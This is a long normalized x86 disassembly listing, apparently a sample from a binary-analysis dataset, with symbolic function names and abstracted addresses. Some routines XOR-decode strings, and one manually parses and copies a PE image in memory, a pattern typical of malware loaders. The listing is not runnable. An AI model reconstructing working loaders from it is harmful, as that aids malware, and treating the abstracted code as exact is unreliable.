mov [ ebp - 0x34 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1003b4eb
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x30 ] 0x1
jb r-xdata
test [ ebp - 0x30 ] 0x1
je r-xdata
and [ ebp - 0x30 ] 0xfffffffd
lea ecx [ ebp - 0x58 ]
call sub_10062210
push eax
lea ecx [ ebp - 0x58 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x30 ] 0x3
mov [ esi ] r--data
call sub_10044c11
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax [ eax ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1001c5c0
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x30 ] al
je r-xdata
sub_1001b8a0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
xor eax eax
push esi
test edx edx
je r-xdata
or eax 0xffffffff
mov ecx [ ecx ]
mov esi [ ebp + 0xc ]
pop esi
pop ebp
retn
inc eax
add ecx 0x4
cmp eax edx
jb r-xdata
cmp [ ecx ] esi
je r-xdata
sub_1001b8c7
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1006034e
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_1001b974
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
mov [ ebp - 0x28 ] eax
lea edi [ ebp - 0x24 ]
call sub_100161f2
test al al
jne r-xdata
push [ ebp - 0x28 ]
mov ecx esi
xor bl bl
call sub_100161f2
test al al
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push [ ebp - 0x28 ]
mov ecx esi
call sub_100161f2
test al al
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_1004cd62
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1004cd62
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] 0x2b
jmp r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_1004cd62
lea eax [ ebp - 0x2c ]
push eax
push 0xa
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x24 ]
xor ebx ebx
push eax
mov [ edi ] 0x0
mov [ ebp - 0x2c ] ebx
call sub_100276d6
add esp 0x10
push [ ebp - 0x28 ]
mov ecx esi
mov edi eax
call sub_100161f2
test al al
je r-xdata
lea edi [ ebp - 0x24 ]
test bl bl
je r-xdata
mov ecx esi
mov bl 0x1
call sub_10017b01
push [ ebp - 0x28 ]
mov ecx esi
call sub_100161f2
test al al
je r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_1004cd62
mov ecx esi
lea edi [ ebp - 0x23 ]
call sub_10017b01
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x30 ] eax
je r-xdata
inc ebx
mov [ edi ] 0x30
inc edi
jmp r-xdata
mov [ ebp - 0x24 ] 0x2d
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_1004cd62
or ebx 0x2
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp edi [ ebp + 0x14 ]
jl r-xdata
mov al [ esi + 0x5 ]
mov [ edi ] al
lea eax [ ebp - 0x5 ]
cmp edi eax
jae r-xdata
mov ecx esi
call sub_1004cd62
cmp [ ebp + 0x18 ] edi
jl r-xdata
mov ecx esi
mov bl 0x1
call sub_10017b01
inc edi
mov eax [ ebp - 0x34 ]
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
sub_1001baf0
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x26
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0xe
jb r-xdata
lea ecx [ ebx + 0x138 ]
xor eax eax
push ecx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x8 ] ax
call sub_1002bc30
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x70 ]
mov eax 0x23
call sub_1000a6f0
sub_1001bb80
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_1001bbc1
push 0x3c
mov eax sub_1007e369
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10009450
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1004770a
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10036d11
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_1002a730
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_1001bcc0
push esi
mov esi [ eax ]
push edi
mov edi ecx
test esi esi
jne r-xdata
push ebx
mov ebx [ lstrcmpW@IAT ]
pop edi
lea eax [ esi + 0x1 ]
pop esi
retn
mov ebx [ esi ]
mov edx edi
call sub_1005d1f0
mov edi [ edi ]
test edi edi
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
pop ebx
pop edi
xor eax eax
pop esi
retn
mov ebx edi
mov edi [ esi ]
call sub_10067170
mov ecx [ edi + 0x4 ]
mov eax [ esi ]
push ecx
mov ecx [ eax + 0x4 ]
push ecx
call ebx
test eax eax
je r-xdata
pop ebx
pop edi
lea eax [ esi + 0x2 ]
pop esi
retn
sub_1001bd20
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov esi edx
push ebx
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0xc ]
push esi
push 0x0
mov [ ebp - 0x30 ] ecx
call sub_1003cdb0
mov edx [ esi ]
add esp 0xc
push 0x0
push edx
push 0x0
push 0x4
push 0x0
push 0xffffffff
call [ CreateFileMappingW@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ esi ]
push eax
push 0x0
push 0x0
push 0xf001f
push edi
call [ MapViewOfFile@IAT ]
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
test eax eax
jne r-xdata
lea eax [ edi + 0x1 ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
push ebx
push esi
push eax
mov eax [ ebp + 0xc ]
call sub_1003cdb0
mov edx [ ebp - 0x30 ]
mov eax [ edx ]
mov esi [ ebp - 0x38 ]
mov [ ebp - 0x30 ] edi
add esp 0xc
add esi 0xd4
lea edi [ ebp - 0x34 ]
mov [ ebp - 0x34 ] eax
call sub_10040ad0
push eax
push esi
lea esi [ ebp - 0x3c ]
call sub_1000a310
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
lea edx [ ebp - 0x2c ]
mov eax 0x5c
call sub_100328b0
push edi
call [ CloseHandle@IAT ]
mov eax 0x2
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
sub_1001be20
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ eax + 0x128 ]
test esi esi
jne r-xdata
push edi
lea edi [ eax + 0x130 ]
lea edx [ ebp - 0x38 ]
mov eax 0xa3
call sub_1000a6f0
lea eax [ esi + 0x1 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
push edi
push esi
call sub_10053720
mov esi [ esi + 0x4 ]
add esp 0x8
test esi esi
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
sub_1001beb0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10019b04
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_1001bee0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
sub eax 0x0
push edi
je r-xdata
mov ecx [ esi + 0x18 ]
mov edi [ ebp + 0x8 ]
push ecx
push edi
call sub_10030ff0
mov edx [ esi + 0x1c ]
push edx
push edi
call sub_10030ff0
mov eax [ esi + 0x20 ]
push eax
push edi
call sub_10030ff0
add esp 0x18
dec eax
je r-xdata
xor edi edi
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ esi + 0x20 ] edi
jbe r-xdata
sub eax 0x2
jne r-xdata
mov eax [ esi + 0x1c ]
push eax
push ebx
call sub_10030ff0
add esp 0x8
pop ebx
pop edi
pop esi
pop ebp
retn
mov edi edi
pop edi
mov eax [ esi + 0x18 ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10030ff0
add esp 0x8
pop edi
pop esi
pop ebp
retn
inc edi
cmp edi [ esi + 0x20 ]
jb r-xdata
push eax
push ebx
call sub_10044fc0
add esp 0x8
mov edx [ esi + 0x1c ]
mov eax [ edx + edi * 4 ]
test eax eax
je r-xdata
sub_1001bf90
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1001caf0
mov [ esi ] al
inc esi
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_1001bfe0
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0xc ]
mov eax 0x5a4d
cmp [ esi ] ax
je r-xdata
push ebx
mov ebx [ esi + 0x3c ]
add ebx esi
cmp [ ebx ] 0x4550
je r-xdata
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebx + 0x50 ]
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] eax
test eax eax
jne r-xdata
pop ebx
mov eax 0x2
pop esi
mov esp ebp
pop ebp
retn 0x8
push edi
mov edi eax
mov eax [ ebp + 0xc ]
mov ecx 0x10
[ edi ] [ esi ]
mov edi [ eax + 0x3c ]
add edi [ edx + 0x1c ]
mov ecx 0x3e
mov esi ebx
[ edi ] [ esi ]
mov eax [ edx + 0x1c ]
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x3c ]
add ecx eax
mov [ edx + 0x8 ] ecx
movzx esi [ ecx + 0x14 ]
movzx eax [ ebx + 0x14 ]
lea esi [ esi + ecx + 0x18 ]
mov [ ebp - 0x4 ] esi
xor esi esi
lea eax [ eax + ebx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
cmp si [ ecx + 0x6 ]
jae r-xdata
pop ebx
mov eax 0x3
pop esi
mov esp ebp
pop ebp
retn 0x8
pop edi
pop ebx
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x8
lea ebx [ edx + 0xc ]
jmp r-xdata
mov edi [ ebp - 0x4 ]
mov esi eax
mov ecx 0xa
[ edi ] [ esi ]
mov ecx [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
add eax [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
push eax
mov eax [ ecx + 0xc ]
add eax [ edx + 0x1c ]
push eax
call sub_10078600
mov eax [ ebx + 0x4 ]
lea ecx [ ebp - 0x4 ]
add esp 0xc
cmp ecx eax
jae r-xdata
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebx ]
lea edx [ ebp - 0x4 ]
cmp ecx edx
ja r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax ebx
call sub_10019240
mov esi edx
sub esi ecx
sar esi 0x2
cmp eax [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x8 ]
movzx edx [ ecx + 0x6 ]
mov eax 0x28
add [ ebp - 0x8 ] eax
add [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
cmp eax edx
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax ebx
call sub_10019240
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebx ]
mov edx [ ecx + esi * 4 ]
mov [ eax ] edx
jmp r-xdata
sub_1001c150
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_1005905c
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_10012991
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_1005905c
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_1005905c
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1005905c
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_100361ab
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_10012991
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_10042d7c
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_10012991
mov [ eax ] 0xd
call sub_1003c242
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_1003c242
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_10012991
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_1000692f
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_100361ab
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
jne r-xdata
sub_1001c310
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ecx + 0x10 ]
cmp edi ebx
jae r-xdata
mov eax [ ebp + 0x10 ]
sub edi ebx
cmp eax edi
jae r-xdata
push r--data
call sub_1003b4a6
cmp esi ecx
jne r-xdata
mov edi eax
cmp edi 0x7ffffffe
jbe r-xdata
push 0xffffffff
add edi ebx
push edi
mov ecx esi
call sub_10007cf0
push ebx
push 0x0
mov ecx esi
call sub_10007cf0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_100616c6
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_1000fb70
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x8
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
pop edi
mov eax esi
xor ecx ecx
pop esi
mov [ eax ] cx
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
xor ecx ecx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor edx edx
mov [ ebx + eax ] dx
mov eax [ esi ]
xor edx edx
mov [ ebx + eax ] dx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx [ ebp + 0xc ]
lea ebx [ edi + edi ]
push ebx
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_10078600
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_1001c410
push ebp
mov ebp esp
push 0xffffffff
push sub_10081420
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + edi + 0xc ]
add ecx edi
test eax eax
jne r-xdata
mov eax [ ecx + 0xc ]
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x3c ]
test ecx ecx
je r-xdata
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
mov edx [ edi ]
mov ecx [ edx + 0x4 ]
add ecx edi
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov esi ecx
call sub_10064ff0
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0x0
call sub_10007bc0
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_1001c4b0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100067d1
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x4 ]
call sub_1002470e
pop esi
mov esp ebp
pop ebp
retn
inc eax
mov [ esi + 0x4 ] eax
sub_1001c4da
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1000363b
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002868d
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10037533
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x18
sub_1001c570
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push 0xa
push eax
call sub_10024af0
mov ecx [ ebp + 0xc ]
add esp 0x8
mov [ ecx ] eax
mov [ ecx + 0x4 ] 0x0
mov [ ecx + 0x8 ] 0xa
pop ebp
retn
sub_1001c5c0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
je r-xdata
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0xf
mov [ edi + esi ] 0x0
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push ebx
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_10065045
add esp 0x4
pop ebx
push edi
push ebx
push esi
call sub_10078600
add esp 0xc
sub_1001c659
push 0x5c
mov eax sub_1007ebd6
call sub_10007703
fldz
mov eax [ ebp + 0x8 ]
fld [ ebp + 0x20 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp + 0x18 ]
fcom st1
mov [ ebp - 0x68 ] eax
xor ebx ebx
mov edi ecx
mov [ ebp - 0x64 ] bl
fnstsw ax
fstp st1
test ah 0x5
jpe r-xdata
fld [ r--data ]
mov [ ebp - 0x58 ] ebx
fcom st1
fnstsw ax
test ah 0x41
jpo r-xdata
mov [ ebp - 0x64 ] 0x1
fchs
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
fstp st0
jmp r-xdata
fxch st1
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fcom st1
fnstsw ax
test ah 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x40 ] 0x7
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] ax
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
mov [ ebp - 0x4 ] ebx
call sub_1002868d
add esp 0x14
xor esi esi
mov [ ebp - 0x5c ] eax
cmp eax ebx
jle r-xdata
fxch st1
fstp st1
lea eax [ edi + 0x8 ]
push eax
push ebx
push 0x30
call sub_1005e05a
movzx eax ax
add esp 0xc
push eax
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_10039dd0
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x5c ] esp
push eax
call sub_10039520
push [ ebp - 0x64 ]
mov ecx edi
push [ ebp + 0x1c ]
push [ ebp - 0x68 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x60 ]
call sub_10037788
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10024aa0
mov eax [ ebp - 0x60 ]
call sub_10019c00
retn 0x20
lea eax [ edi + 0x8 ]
push eax
movzx eax [ ebp + esi - 0x38 ]
push ebx
push eax
call sub_1005e05a
movzx eax ax
add esp 0xc
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10039dd0
inc esi
cmp esi [ ebp - 0x5c ]
jl r-xdata
sub_1001c782
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1006312b
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] eax
lea eax [ ebp + 0x8 ]
push eax
mov [ esi + 0x10 ] edx
call sub_1001e25a
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
and [ eax ] 0x0
push [ ebp + 0x8 ]
call sub_10020a90
pop ecx
pop esi
pop ebp
retn 0x4
sub_1001c7c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081b18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
xor edi edi
mov ebx ecx
mov [ ebp - 0x5c ] ebx
cmp eax edi
je r-xdata
xor eax eax
lea ecx [ ebp - 0x54 ]
push ecx
push eax
mov [ ebp - 0x54 ] edi
call [ CommandLineToArgvW@IAT ]
mov esi [ ebp - 0x54 ]
mov [ ebp - 0x4c ] eax
cmp esi edi
jne r-xdata
mov eax ebx
lea edx [ eax + 0x2 ]
cmp eax edi
je r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
inc eax
mov [ ebp - 0x58 ] eax
test esi esi
jg r-xdata
push eax
push edi
jmp r-xdata
xor edx edx
mov eax ebx
mov [ ebp - 0x2c ] dx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov eax [ ebp - 0x4c ]
test eax eax
je r-xdata
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push ebx
lea ecx [ ebp - 0x2c ]
call sub_1005e3c0
lea eax [ ebp - 0x2c ]
push eax
mov edx r--data
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_10045750
mov esi 0x8
add esp 0x4
cmp [ eax + 0x14 ] esi
jb r-xdata
push eax
push 0x0
mov ecx [ ebp - 0x58 ]
mov edx [ ebp - 0x4c ]
push ecx
push eax
mov eax [ edx + edi * 4 ]
push eax
call sub_1001a788
add esp 0xc
test eax eax
sete bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] dx
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10065045
add esp 0x4
test bl bl
je r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10065045
add esp 0x4
inc edi
cmp edi [ ebp - 0x54 ]
jl r-xdata
